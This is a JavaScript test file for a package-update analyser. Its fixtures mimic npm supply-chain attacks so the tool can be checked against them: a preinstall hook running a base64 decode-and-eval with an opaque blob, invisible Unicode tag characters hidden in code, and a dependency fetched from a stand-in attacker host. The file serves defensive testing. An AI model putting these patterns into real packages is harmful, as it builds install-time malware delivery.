// Golden tests. In-memory fixtures reconstruct the SHAPE of real 2024–26 attacks
// (we can't ship the live malware), plus a benign update to guard false positives.

import { randomBytes } from 'node:crypto';
import { analyzeArtifacts } from '../src/analyze.js';

const buf = (s) => Buffer.from(s, 'utf8');
let pass = 0, fail = 0;

function check(name, cond, detail = '') {
  if (cond) { pass++; console.log(`  \x1b[32m✓\x1b[0m ${name}`); }
  else { fail++; console.log(`  \x1b[31m✗ ${name}\x1b[0m ${detail}`); }
}
const codes = (v) => v.findings.map((f) => f.code);

// ── 1. Benign minor update — must NOT trip anything ──────────────────────────
{
  const from = new Map([
    ['package.json', buf(JSON.stringify({ name: 'demo', version: '1.0.0', scripts: { test: 'node t.js' }, dependencies: { 'left-pad': '^1.3.0' } }))],
    ['index.js', buf("export function greet(n){ return 'hi ' + n }\n")],
  ]);
  const to = new Map([
    ['package.json', buf(JSON.stringify({ name: 'demo', version: '1.0.1', scripts: { test: 'node t.js' }, dependencies: { 'left-pad': '^1.3.0' } }))],
    ['index.js', buf("export function greet(n){ return 'hi ' + n }\nexport function bye(n){ return 'bye ' + n }\n")],
  ]);
  const v = analyzeArtifacts(from, to, { ecosystem: 'npm', name: 'demo', from: '1.0.0', to: '1.0.1' });
  console.log('\nbenign minor update (demo 1.0.0 → 1.0.1)');
  check('scores clear', v.score >= 70, `got ${v.score}`);
  check('verdict ALLOW', v.verdict === 'ALLOW', v.verdict);
  check('no findings', v.findings.length === 0, codes(v).join(','));
}

// ── 2. keyv signature — preinstall hook + opaque blob + decode-exec ──────────
{
  const from = new Map([
    ['package.json', buf(JSON.stringify({ name: 'cache-thing', version: '5.9.0', scripts: {}, dependencies: {} }))],
    ['index.js', buf("module.exports = require('./lib/store')\n")],
    ['lib/store.js', buf('module.exports = { get(){}, set(){} }\n')],
  ]);
  const to = new Map([
    ['package.json', buf(JSON.stringify({ name: 'cache-thing', version: '6.0.0', scripts: { preinstall: 'node setup.mjs' }, dependencies: {} }))],
    ['index.js', buf("module.exports = require('./lib/store')\n")],
    ['lib/store.js', buf('module.exports = { get(){}, set(){} }\n')],
    ['setup.mjs', buf("const p = process.env; eval(Buffer.from('Li4u','base64').toString());\n")],
    ['Math_Symbol.js', randomBytes(60 * 1024)], // 60 KB "encrypted" second stage
  ]);
  const v = analyzeArtifacts(from, to, { ecosystem: 'npm', name: 'cache-thing', from: '5.9.0', to: '6.0.0' });
  console.log('\nkeyv-shape malicious update (cache-thing 5.9.0 → 6.0.0)');
  check('scores block', v.score <= 24, `got ${v.score}`);
  check('verdict HOLD', v.verdict === 'HOLD', v.verdict);
  check('flags install hook', codes(v).includes('INSTALL_HOOK_NEW'));
  check('flags opaque blob', codes(v).includes('OPAQUE_BLOB_NEW'));
  check('flags dropper combo', codes(v).includes('INSTALL_HOOK_WITH_BLOB'));
  check('flags decode-exec', codes(v).includes('EVAL_DECODE_EXEC'));
  check('high confidence', v.confidence === 'high');
}

// ── 3. GlassWorm — invisible unicode hidden in code ──────────────────────────
{
  const clean = "export const version = '2.1.0'\n";
  // tag-block codepoints (U+E0000–E007F): render blank, execute in JS engine
  const hidden = "export const version = '2.1.0'\u{E0072}\u{E0075}\u{E006E}\n";
  const from = new Map([['index.js', buf(clean)], ['package.json', buf('{"name":"x","version":"2.0.0"}')]]);
  const to = new Map([['index.js', buf(hidden)], ['package.json', buf('{"name":"x","version":"2.1.0"}')]]);
  const v = analyzeArtifacts(from, to, { ecosystem: 'npm', name: 'x', from: '2.0.0', to: '2.1.0' });
  console.log('\nGlassWorm-shape (invisible unicode in code)');
  check('flags invisible unicode', codes(v).includes('INVISIBLE_UNICODE'));
  check('holds the update', v.verdict === 'HOLD', `${v.score}`);
}

// ── 4. PhantomRaven — dependency resolves outside the registry ───────────────
{
  const from = new Map([['package.json', buf(JSON.stringify({ name: 'y', version: '1.0.0', dependencies: { chalk: '^5.0.0' } }))]]);
  const to = new Map([['package.json', buf(JSON.stringify({ name: 'y', version: '1.1.0', dependencies: { chalk: '^5.0.0', helper: 'http://cdn.evil.example/h.tgz' } }))]]);
  const v = analyzeArtifacts(from, to, { ecosystem: 'npm', name: 'y', from: '1.0.0', to: '1.1.0' });
  console.log('\nPhantomRaven-shape (non-registry dependency URL)');
  check('flags non-registry dep', codes(v).includes('NON_REGISTRY_DEP'));
  check('holds the update', v.verdict === 'HOLD', `${v.score}`);
}

console.log(`\n${fail === 0 ? '\x1b[32m' : '\x1b[31m'}${pass} passed, ${fail} failed\x1b[0m\n`);
process.exit(fail === 0 ? 0 : 1);
